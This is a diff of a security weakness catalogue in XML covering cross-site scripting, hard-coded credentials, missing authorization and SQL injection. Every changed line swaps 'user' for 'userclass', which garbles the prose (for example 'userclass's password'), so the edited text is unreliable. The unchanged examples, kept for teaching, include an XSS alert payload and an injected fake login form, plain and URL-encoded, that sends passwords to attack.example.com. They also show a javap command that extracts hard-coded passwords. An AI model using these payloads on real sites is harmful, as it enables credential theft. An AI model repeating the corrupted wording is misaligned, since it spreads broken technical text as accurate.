-               <Note>The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.</Note>
+               <Note>The most common attack performed with cross-site scripting involves the disclosure of information stored in userclass cookies. Typically, a malicious userclass will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each userclass visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.</Note>
             </Consequence>
             <Consequence>
                <Scope>Integrity</Scope>
@@ -10043,7 +10043,7 @@
                <Impact>Execute Unauthorized Code or Commands</Impact>
                <Impact>Bypass Protection Mechanism</Impact>
                <Impact>Read Application Data</Impact>
-               <Note>The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.</Note>
+               <Note>The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end userclass that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid userclass, compromise confidential information, or execute malicious code on the end userclass systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end userclass files, installation of Trojan horse programs, redirecting the userclass to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a userclass perceives as trustworthy, and modifying presentation of content.</Note>
             </Consequence>
          </Common_Consequences>
          <Detection_Methods>
@@ -10120,7 +10120,7 @@
             <Mitigation Mitigation_ID="MIT-31">
                <Phase>Implementation</Phase>
                <Strategy>Attack Surface Reduction</Strategy>
-               <Description>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</Description>
+               <Description>To help mitigate XSS attacks against the userclass's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the userclass's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</Description>
                <Effectiveness>Defense in Depth</Effectiveness>
             </Mitigation>
             <Mitigation Mitigation_ID="MIT-5">
@@ -10130,7 +10130,7 @@
                   <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                   <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                   <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
-                  <xhtml:p>When dynamically constructing web pages, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</xhtml:p>
+                  <xhtml:p>When dynamically constructing web pages, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the userclass is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</xhtml:p>
                   <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon ("&lt;3") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the "&lt;" character, which would need to be escaped or otherwise handled. In this case, stripping the "&lt;" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.</xhtml:p>
                   <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
                   <xhtml:p>Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</xhtml:p>
@@ -10166,17 +10166,17 @@
                   <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;Script Language="Javascript"&gt;alert("You've been attacked!");&lt;/Script&gt;</xhtml:div>
                </Example_Code>
                <Body_Text>This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.</Body_Text>
-               <Body_Text>More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:</Body_Text>
+               <Body_Text>More realistically, the attacker can embed a fake login box on the page, tricking the userclass into sending the userclass's password to the attacker:</Body_Text>
                <Example_Code Nature="attack">
                   <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;div id="stealPassword"&gt;Please Login:&lt;form name="input" action="http://attack.example.com/stealPassword.php" method="post"&gt;Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;&lt;input type="submit" value="Login" /&gt;&lt;/form&gt;&lt;/div&gt;</xhtml:div>
                </Example_Code>
-               <Body_Text>If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:</Body_Text>
+               <Body_Text>If a userclass clicks on this link then Welcome.php will generate the following HTML and send it to the userclass's browser:</Body_Text>
                <Example_Code Nature="result">
                   <xhtml:div>&lt;div class="header"&gt; Welcome, &lt;div id="stealPassword"&gt; Please Login:<xhtml:div style="margin-left:10px;">
                         <xhtml:br/>&lt;form name="input" action="attack.example.com/stealPassword.php" method="post"&gt;<xhtml:div style="margin-left:10px;">Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;<xhtml:br/>Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;<xhtml:br/>&lt;input type="submit" value="Login" /&gt;</xhtml:div>&lt;/form&gt;</xhtml:div>
                      <xhtml:br/>&lt;/div&gt;&lt;/div&gt;</xhtml:div>
                </Example_Code>
-               <Body_Text>The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):</Body_Text>
+               <Body_Text>The trustworthy domain of the URL may falsely assure the userclass that it is OK to follow the link. However, an astute userclass may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):</Body_Text>
                <Example_Code Nature="attack">
                   <xhtml:div>trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22<xhtml:br/>stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input<xhtml:br/>%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php<xhtml:br/>%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text<xhtml:br/>%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A<xhtml:br/>+%3Cinput+type%3D%22password%22+name%3D%22password%22<xhtml:br/>+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22<xhtml:br/>+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</xhtml:div>
                </Example_Code>
@@ -10188,11 +10188,11 @@
             </Demonstrative_Example>
             <Demonstrative_Example>
                <Intro_Text>This example also displays a Reflected XSS (Type 1) scenario.</Intro_Text>
-               <Body_Text>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.</Body_Text>
+               <Body_Text>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the userclass.</Body_Text>
                <Example_Code Nature="bad" Language="JSP">
                   <xhtml:div>&lt;% String eid = request.getParameter("eid"); %&gt;<xhtml:br/>...<xhtml:br/>Employee ID: &lt;%= eid %&gt;</xhtml:div>
                </Example_Code>
-               <Body_Text>The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.</Body_Text>
+               <Body_Text>The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the userclass.</Body_Text>
                <Example_Code Nature="bad" Language="ASP.NET">
                   <xhtml:div>&lt;%<xhtml:br/>protected System.Web.UI.WebControls.TextBox Login;<xhtml:br/>protected System.Web.UI.WebControls.Label EmployeeID;<xhtml:br/>...<xhtml:br/>EmployeeID.Text = Login.Text;<xhtml:br/>%&gt;<xhtml:br/>
                      <xhtml:br/>&lt;p&gt;&lt;asp:label id="EmployeeID" runat="server" /&gt;&lt;/p&gt;</xhtml:div>
@@ -10210,10 +10210,10 @@
                <Example_Code Nature="bad" Language="ASP.NET">
                   <xhtml:div>&lt;%<xhtml:br/>protected System.Web.UI.WebControls.Label EmployeeName;<xhtml:br/>...<xhtml:br/>string query = "select * from emp where id=" + eid;<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>sda.Fill(dt);<xhtml:br/>string name = dt.Rows[0]["Name"];<xhtml:br/>...<xhtml:br/>EmployeeName.Text = name;%&gt;<xhtml:br/>&lt;p&gt;&lt;asp:label id="EmployeeName" runat="server" /&gt;&lt;/p&gt;</xhtml:div>
                </Example_Code>
-               <Body_Text>This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser.</Body_Text>
+               <Body_Text>This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from userclass-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the userclass's web browser.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
-               <Intro_Text>The following example consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.</Intro_Text>
+               <Intro_Text>The following example consists of two separate pages in a web application, one devoted to creating userclass accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.</Intro_Text>
                <Body_Text>CreateUser.php</Body_Text>
                <Example_Code Nature="bad" Language="PHP">
                   <xhtml:div>$username = mysql_real_escape_string($username);<xhtml:br/>$fullName = mysql_real_escape_string($fullName);<xhtml:br/>$query = sprintf('Insert Into users (username,password) Values ("%s","%s","%s")', $username, crypt($password),$fullName) ;<xhtml:br/>mysql_query($query);<xhtml:br/>/.../</xhtml:div>
@@ -10230,7 +10230,7 @@
                <Body_Text>The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
-               <Intro_Text>Consider an application that provides a simplistic message board that saves messages in HTML format and appends them to a file.  When a new user arrives in the room, it makes an announcement:</Intro_Text>
+               <Intro_Text>Consider an application that provides a simplistic message board that saves messages in HTML format and appends them to a file.  When a new userclass arrives in the room, it makes an announcement:</Intro_Text>
                <Example_Code Nature="bad" Language="PHP">
                   <xhtml:div>$name = $_COOKIE["myname"];<xhtml:br/>$announceStr = "$name just logged in.";<xhtml:br/>
                      <xhtml:br/>
@@ -10391,7 +10391,7 @@
          </References>
          <Notes>
             <Note Type="Relationship">
-               <xhtml:p>There can be a close relationship between XSS and CSRF (CWE-352).  An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload.  A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend.  MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.</xhtml:p>
+               <xhtml:p>There can be a close relationship between XSS and CSRF (CWE-352).  An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload.  A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a userclass's profile and add the attacker as a MySpace friend.  MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.</xhtml:p>
             </Note>
             <Note Type="Applicable Platform">
                <xhtml:p>XSS flaws are very common in web applications, since they require a great deal of developer discipline to avoid them.</xhtml:p>
@@ -10620,7 +10620,7 @@
                <xhtml:div>Outbound: the software connects to another system or component, and it contains hard-coded credentials for connecting to that component.</xhtml:div>
             </xhtml:div>
             <xhtml:p>In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.</xhtml:p>
-            <xhtml:p>The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</xhtml:p>
+            <xhtml:p>The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any userclass of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</xhtml:p>
          </Extended_Description>
          <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
@@ -10807,7 +10807,7 @@
             </Mitigation>
             <Mitigation>
                <Phase>Architecture and Design</Phase>
-               <Description>For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a "first login" mode that requires the user to enter a unique strong password or key.</Description>
+               <Description>For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a "first login" mode that requires the userclass to enter a unique strong password or key.</Description>
             </Mitigation>
             <Mitigation>
                <Phase>Architecture and Design</Phase>
@@ -10840,7 +10840,7 @@
                <Example_Code Nature="bad" Language="Java">
                   <xhtml:div>...<xhtml:br/>DriverManager.getConnection(url, "scott", "tiger");<xhtml:br/>...</xhtml:div>
                </Example_Code>
-               <Body_Text>This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:</Body_Text>
+               <Body_Text>This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database userclass "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:</Body_Text>
                <Example_Code Nature="attack">
                   <xhtml:div>javap -c ConnMngr.class<xhtml:div style="margin-left:10px;">22: ldc #36; //String jdbc:mysql://ixne.com/rxsql<xhtml:br/>24: ldc #38; //String scott<xhtml:br/>26: ldc #17; //String tiger</xhtml:div>
                   </xhtml:div>
@@ -11117,7 +11117,7 @@
       <Weakness ID="862" Name="Missing Authorization" Abstraction="Class" Structure="Simple" Status="Incomplete">
          <Description>The software does not perform an authorization check when an actor attempts to access a resource or perform an action.</Description>
          <Extended_Description>
-            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
+            <xhtml:p>Assuming a userclass with a given identity, authorization is the process of determining whether that userclass can access a given resource, based on the userclass's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
             <xhtml:p>When access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>
          </Extended_Description>
          <Related_Weaknesses>
@@ -11130,7 +11130,7 @@
             <Technology Name="Database Server" Prevalence="Often"/>
          </Applicable_Platforms>
          <Background_Details>
-            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>
+            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A userclass can create an object (file) and assign specified permissions to that object.</Background_Detail>
          </Background_Details>
          <Alternate_Terms>
             <Alternate_Term>
@@ -11143,7 +11143,7 @@
                <Phase>Architecture and Design</Phase>
                <Note>
                   <xhtml:p>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</xhtml:p>
-                  <xhtml:p>Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.</xhtml:p>
+                  <xhtml:p>Authorization weaknesses may arise when a single-userclass application is ported to a multi-userclass environment.</xhtml:p>
                </Note>
             </Introduction>
             <Introduction>
@@ -11180,7 +11180,7 @@
                <Method>Automated Static Analysis</Method>
                <Description>
                   <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
-                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.</xhtml:p>
+                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any userclass and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.</xhtml:p>
                </Description>
                <Effectiveness>Limited</Effectiveness>
             </Detection_Method>
@@ -11300,12 +11300,12 @@
                <Phase>Architecture and Design</Phase>
                <Description>
                   <xhtml:p>Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.</xhtml:p>
-                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>
+                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a userclass from attacking others with the same role.</xhtml:p>
                </Description>
             </Mitigation>
             <Mitigation>
                <Phase>Architecture and Design</Phase>
-               <Description>Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].</Description>
+               <Description>Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database userclass, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].</Description>
             </Mitigation>
             <Mitigation Mitigation_ID="MIT-4.4">
                <Phase>Architecture and Design</Phase>
@@ -11319,7 +11319,7 @@
                <Phase>Architecture and Design</Phase>
                <Description>
                   <xhtml:p>For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.</xhtml:p>
-                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.</xhtml:p>
+                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a userclass who has the required permissions to access that page.</xhtml:p>
                </Description>
             </Mitigation>
             <Mitigation>
@@ -11339,10 +11339,10 @@
                      <xhtml:br/>
                      <xhtml:br/>$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);</xhtml:div>
                </Example_Code>
-               <Body_Text>While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database.</Body_Text>
+               <Body_Text>While this code is careful to avoid SQL Injection, the function does not confirm the userclass sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-96">
-               <Intro_Text>The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.</Intro_Text>
+               <Intro_Text>The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the userclass before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.</Intro_Text>
                <Example_Code Nature="bad" Language="Perl">
                   <xhtml:div>sub DisplayPrivateMessage {<xhtml:div style="margin-left:10px;">my($id) = @_;<xhtml:br/>my $Message = LookupMessageObject($id);<xhtml:br/>print "From: " . encodeHTML($Message-&gt;{from}) . "&lt;br&gt;\n";<xhtml:br/>print "Subject: " . encodeHTML($Message-&gt;{subject}) . "\n";<xhtml:br/>print "&lt;hr&gt;\n";<xhtml:br/>print "Body: " . encodeHTML($Message-&gt;{body}) . "\n";</xhtml:div>}<xhtml:br/>
                      <xhtml:br/>my $q = new CGI;<xhtml:br/>
@@ -11354,8 +11354,8 @@
                      <xhtml:br/>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:10px;">ExitError("invalid username or password");</xhtml:div>}<xhtml:br/>
                      <xhtml:br/>my $id = $q-&gt;param('id');<xhtml:br/>DisplayPrivateMessage($id);</xhtml:div>
                </Example_Code>
-               <Body_Text>While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.</Body_Text>
-               <Body_Text>One way to avoid this problem would be to ensure that the "to" field in the message object matches the username of the authenticated user.</Body_Text>
+               <Body_Text>While the program properly exits if authentication fails, it does not ensure that the message is addressed to the userclass. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.</Body_Text>
+               <Body_Text>One way to avoid this problem would be to ensure that the "to" field in the message object matches the username of the authenticated userclass.</Body_Text>
             </Demonstrative_Example>
          </Demonstrative_Examples>
          <Observed_Examples>
@@ -11426,7 +11426,7 @@
             </Observed_Example>
 	   <Observed_Example>
 	     <Reference>CVE-2005-1036</Reference>
-	     <Description>Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap</Description>
+	     <Description>Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a userclass results from an improperly initialized (CWE-909) I/O permission bitmap</Description>
 	     <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1036</Link>
 	   </Observed_Example>
             <Observed_Example>
@@ -11577,8 +11577,8 @@
       <Weakness ID="89" Name="Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')" Abstraction="Base" Structure="Simple" Status="Stable">
          <Description>The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.</Description>
          <Extended_Description>
-            <xhtml:p>Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.</xhtml:p>
-            <xhtml:p>SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or software package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.</xhtml:p>
+            <xhtml:p>Without sufficient removal or quoting of SQL syntax in userclass-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary userclass data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.</xhtml:p>
+            <xhtml:p>SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or software package with even a minimal userclass base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.</xhtml:p>
          </Extended_Description>
          <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
@@ -11591,7 +11591,7 @@
          <Modes_Of_Introduction>
             <Introduction>
                <Phase>Architecture and Design</Phase>
-               <Note>This weakness typically appears in data-rich applications that save user inputs in a database.</Note>
+               <Note>This weakness typically appears in data-rich applications that save userclass inputs in a database.</Note>
             </Introduction>
             <Introduction>
                <Phase>Implementation</Phase>
@@ -11608,7 +11608,7 @@
             <Consequence>
                <Scope>Access Control</Scope>
                <Impact>Bypass Protection Mechanism</Impact>
-               <Note>If poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password.</Note>
+               <Note>If poor SQL commands are used to check userclass names and passwords, it may be possible to connect to a system as another userclass with no previous knowledge of the password.</Note>
             </Consequence>
             <Consequence>
                <Scope>Access Control</Scope>
@@ -11776,7 +11776,7 @@
                <Strategy>Environment Hardening</Strategy>
                <Description>
                   <xhtml:p>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</xhtml:p>
-                  <xhtml:p>Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.</xhtml:p>
+                  <xhtml:p>Specifically, follow the principle of least privilege when creating userclass accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a userclass can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.</xhtml:p>
                </Description>
             </Mitigation>
             <Mitigation Mitigation_ID="MIT-15">
@@ -11813,7 +11813,7 @@
                <Description>
                   <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                   <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
-		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
+		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a userclass account exists or not.</xhtml:p>
                   <xhtml:p>In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.</xhtml:p>
                </Description>
             </Mitigation>
@@ -11836,7 +11836,7 @@
                <Intro_Text>In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code.</Intro_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
